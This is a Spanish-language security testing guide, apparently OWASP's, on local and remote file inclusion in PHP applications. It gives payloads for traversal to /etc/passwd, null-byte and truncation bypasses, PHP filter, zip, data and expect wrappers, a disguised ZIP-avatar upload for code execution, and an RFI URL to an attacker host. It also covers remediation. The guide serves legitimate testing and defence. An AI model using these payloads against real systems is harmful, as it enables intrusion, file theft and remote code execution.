# Pruebas de Inclusión de Archivos

## Resumen

La vulnerabilidad de Inclusión de Archivos permite a un atacante incluir un archivo, generalmente explotando un mecanismo de "inclusión de archivos dinámica" implementado en la aplicación objetivo. La vulnerabilidad ocurre debido al uso de entrada proporcionada por el usuario sin validación adecuada.

Esto puede llevar a algo tan simple como mostrar el contenido del archivo, pero también puede llevar a:

- Ejecución de código en el servidor web
- Ejecución de código en el lado del cliente, como JavaScript, que puede llevar a otros ataques como scripting entre sitios (XSS)
- Denegación de Servicio (DoS)
- Divulgación de Información Sensible

La Inclusión de Archivos Locales (LFI) es el proceso de incluir archivos que ya están presentes en el servidor mediante la explotación de procedimientos de inclusión vulnerables implementados en la aplicación. Por ejemplo, esta vulnerabilidad ocurre cuando una página recibe entrada que es una ruta a un archivo local. Esta entrada no se sanitiza adecuadamente, permitiendo que se inyecten caracteres de recorrido de directorios (como `../` -- ver 4.5.1 [Pruebas de Recorrido de Directorios e Inclusión de Archivos](../05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include-es.md)).

La Inclusión de Archivos Remotos (RFI) es el proceso de incluir archivos de fuentes remotas mediante la explotación de procedimientos de inclusión vulnerables implementados en la aplicación. Por ejemplo, esta vulnerabilidad ocurre cuando una página recibe entrada que es la URL a un archivo remoto. Esta entrada no se sanitiza adecuadamente, permitiendo que se inyecten URLs externas.

En ambos casos, aunque la mayoría de los ejemplos apuntan a scripts PHP vulnerables, debemos tener en cuenta que también es común en otras tecnologías como JSP, ASP, etc.

## Objetivos de la Prueba

- Identificar puntos de inclusión de archivos.
- Evaluar la gravedad o el impacto potencial de las vulnerabilidades.

## Cómo Probar

### Pruebas de Inclusión de Archivos Locales

Dado que LFI ocurre cuando las rutas pasadas a declaraciones `include` no se sanitizan adecuadamente, en un enfoque de pruebas de caja negra, debemos buscar funcionalidad que acepte nombres de archivos/rutas como parámetros.

Considere el siguiente ejemplo:

`https://vulnerable_host/preview.php?file=example.html`

Esto parece un lugar prometedor para intentar LFI. Si la aplicación no selecciona la página apropiada dada en el parámetro `file` y en su lugar incluye directamente la entrada, es posible incluir archivos arbitrarios del servidor.

Una explotación típica de prueba de concepto sería intentar cargar el archivo `passwd` con:

`https://vulnerable_host/preview.php?file=../../../../etc/passwd`

Si se cumplen las condiciones mencionadas anteriormente, un atacante vería algo como lo siguiente incluido en la respuesta:

```bash
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
alex:x:500:500:alex:/home/alex:/bin/bash
margo:x:501:501::/home/margo:/bin/bash
...
```

Incluso cuando existe tal vulnerabilidad, su explotación podría ser más compleja en escenarios de la vida real. Considere el siguiente fragmento de código:

```php
<?php include($_GET['file'].".php"); ?>
```

Una sustitución simple con un nombre de archivo aleatorio no funcionaría ya que el sufijo `.php` se añade a la entrada proporcionada. Para eludirlo, un probador puede usar varias técnicas para obtener la explotación esperada.

#### Inyección de Byte Nulo

El `carácter nulo` (también conocido como `terminador nulo` o `byte nulo`) es un carácter de control con valor cero presente en muchos conjuntos de caracteres que se usa como carácter reservado para marcar el final de una cadena. Una vez usado, cualquier carácter después de este byte especial se ignora. Comúnmente, la forma de inyectar este carácter sería con la cadena codificada en URL `%00` añadiéndola a la ruta solicitada. En nuestro ejemplo anterior, realizar una solicitud a `https://vulnerable_host/preview.php?file=../../../../etc/passwd%00` ignoraría la extensión `.php` siendo añadida al nombre de archivo de entrada, devolviendo a un atacante una lista de usuarios básicos como resultado de una explotación exitosa.

#### Truncamiento de Ruta y Punto

La mayoría de las instalaciones de PHP tienen un límite de nombre de archivo de 4096 bytes. Si cualquier nombre de archivo dado es más largo que esa longitud, PHP simplemente lo trunca, descartando cualquier carácter adicional. Abusar de este comportamiento hace posible hacer que el motor de PHP ignore la extensión `.php` moviéndola fuera del límite de 4096 bytes. Cuando esto sucede, no se activa ningún error; los caracteres adicionales simplemente se descartan y PHP continúa su ejecución normalmente.

Este bypass se combinaría comúnmente con otras estrategias de bypass de lógica, como codificar parte de la ruta del archivo con codificación Unicode, la introducción de codificación doble, o cualquier otra entrada que aún represente el nombre de archivo deseado válido.

#### Wrappers de PHP

Las vulnerabilidades de Inclusión de Archivos Locales se ven comúnmente como vulnerabilidades de solo lectura que un atacante puede usar para leer datos sensibles del servidor que aloja la aplicación vulnerable. Sin embargo, en algunas implementaciones específicas, esta vulnerabilidad se puede usar para mejorar el ataque [de LFI a Ejecución Remota de Código](https://www.corben.io/zip-to-rce-lfi/) vulnerabilidades que podrían comprometer completamente el host.

Esta mejora es común cuando un atacante podría combinar la [vulnerabilidad LFI con ciertos wrappers de PHP](https://www.netsparker.com/blog/web-security/php-stream-wrappers/).

Un wrapper es un código que rodea otro código para realizar alguna funcionalidad añadida. PHP implementa muchos [wrappers incorporados](https://www.php.net/manual/en/wrappers.php) para usar con funciones del sistema de archivos. Una vez que su uso se detecta durante el proceso de prueba de una aplicación, es una buena práctica intentar abusar de él para identificar el riesgo real de la(s) debilidad(es) detectada(s). A continuación se muestra una lista con los wrappers más comúnmente usados, aunque debe considerar que no es exhaustiva y al mismo tiempo es posible registrar wrappers personalizados que, si se emplean por el objetivo, requerirían un análisis adhoc más profundo.

##### PHP Filter

Usado para acceder al sistema de archivos local; este es un wrapper insensible a mayúsculas que proporciona la capacidad de aplicar filtros a un flujo en el momento de abrir un archivo. Este wrapper se puede usar para obtener contenido de un archivo impidiendo que el servidor lo ejecute. Por ejemplo, permitiendo a un atacante leer el contenido de archivos PHP para obtener código fuente e identificar información sensible como credenciales u otras vulnerabilidades explotables.

El wrapper se puede usar como `php://filter/convert.base64-encode/resource=FILE` donde `FILE` es el archivo a recuperar. Como resultado del uso de esta ejecución, el contenido del archivo objetivo se leería, codificado a base64 (este es el paso que previene la ejecución del lado del servidor), y devuelto al User-Agent.

##### PHP ZIP

En PHP 7.2.0, se introdujo el wrapper `zip://` para manipular archivos comprimidos `zip`. Este wrapper espera la siguiente estructura de parámetro: `zip:///filename_path#internal_filename`. El `filename_path` es la ruta al archivo ZIP malicioso y `internal_filename` es la ruta del archivo malicioso colocado dentro del archivo ZIP procesado. Durante la explotación, es común que el `#` se codifique con su valor codificado en URL `%23`.

El abuso de este wrapper podría permitir a un atacante diseñar un archivo ZIP malicioso que podría subirse al servidor, por ejemplo como una imagen de avatar o usando cualquier sistema de subida de archivos disponible en el sitio objetivo (el wrapper `php:zip://` no requiere que el archivo ZIP tenga ninguna extensión específica) para ser ejecutado por la vulnerabilidad LFI.

Para probar esta vulnerabilidad, se podría seguir el siguiente procedimiento para atacar el ejemplo de código anterior proporcionado.

1. Crear el archivo PHP a ejecutar, por ejemplo con el contenido `<?php phpinfo(); ?>` y guardarlo como `code.php`.
2. Comprimirlo como un nuevo archivo ZIP llamado `target.zip`.
3. Renombrar el archivo `target.zip` a `target.jpg` para eludir la validación de extensión y subirlo al sitio web objetivo como tu imagen de avatar.
4. Suponiendo que el archivo `target.jpg` se almacena localmente en el servidor a la ruta `../avatar/target.jpg`, explotar la vulnerabilidad con el wrapper PHP ZIP inyectando el siguiente payload a la URL vulnerable: `zip://../avatar/target.jpg%23code` (recuerda que `%23` corresponde a `#`).

Dado que en nuestra muestra la extensión `.php` se concatena a nuestro payload, la solicitud a `https://vulnerable_host/preview.php?file=zip://../avatar/target.jpg%23code` resultará en la ejecución del archivo `code.php` existente en el archivo ZIP malicioso.

##### PHP Data

Disponible desde PHP 5.2.0, este wrapper espera el siguiente uso: `data://text/plain;base64,BASE64_STR` donde `BASE64_STR` se espera que sea el contenido codificado en base64 del archivo a procesar. Es importante considerar que este wrapper solo estaría disponible si la opción `allow_url_include` estuviera habilitada.

Para probar LFI usando este wrapper, el código a ejecutar debería codificarse en base64. Por ejemplo, `<?php phpinfo(); ?>` se codificaría como: `PD9waHAgcGhwaW5mbygpOyA/Pg==` y el payload se representaría como: `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`.

##### PHP Expect

Este wrapper, que no está habilitado por defecto, proporciona acceso a procesos `stdio`, `stdout`, y `stderr`. Dado en el formato `expect://command`, el servidor ejecutaría el comando proporcionado usando `BASH` y devolvería el resultado.

### Pruebas de Inclusión de Archivos Remotos

Dado que RFI ocurre cuando las URLs pasadas a declaraciones `include` no se sanitizan adecuadamente, en un enfoque de pruebas de caja negra, debemos buscar scripts que tomen nombres de archivos como parámetros. Considere el siguiente ejemplo de PHP:

```php
$incfile = $_REQUEST["file"];
include($incfile.".php");
```

En este ejemplo, la ruta se extrae de la solicitud HTTP y no se hace validación de entrada (por ejemplo, verificando la entrada contra una lista de permitidos), por lo que este fragmento de código es vulnerable a este tipo de ataque. Considere la siguiente URL:

`https://vulnerable_host/vuln_page.php?file=https://attacker_site/malicous_page`

En este caso, el archivo remoto se incluirá y cualquier código contenido en él se ejecutará en el servidor.

## Remediation

La solución más efectiva para eliminar vulnerabilidades de inclusión de archivos es evitar pasar entrada enviada por el usuario a cualquier API de sistema de archivos/framework. Si esto no es posible, la aplicación puede mantener una lista de permitidos de archivos que pueden ser incluidos por la página, y luego usar un identificador (por ejemplo, el número de índice) para acceder al archivo seleccionado. Cualquier solicitud que contenga un identificador inválido debería rechazarse para que no haya oportunidad para que usuarios maliciosos manipulen la ruta.
Consulte la [Hoja de Trucos de Subida de Archivos](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) para buenas prácticas de seguridad en este tema.

## Herramientas

- [kadimus](https://github.com/P0cL4bs/Kadimus)
- [LFI Suite](https://github.com/D35m0nd142/LFISuite)
- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org)

## Referencias

- [Wikipedia](https://www.wikipedia.org/wiki/Local_File_Inclusion)
- [Null character](https://en.wikipedia.org/wiki/Null_character)
- [Unicode Encoding](https://owasp.org/www-community/attacks/Unicode_Encoding)
- [Double Encoding](https://owasp.org/www-community/Double_Encoding)
- [PHP Supported Protocols and Wrappers](https://www.php.net/manual/en/wrappers.php)
- [RFC 2397 - The "data" URL scheme](https://www.rfc-editor.org/rfc/rfc2397)
- [Wikipedia: "Remote File Inclusion"](https://en.wikipedia.org/wiki/Remote_File_Inclusion)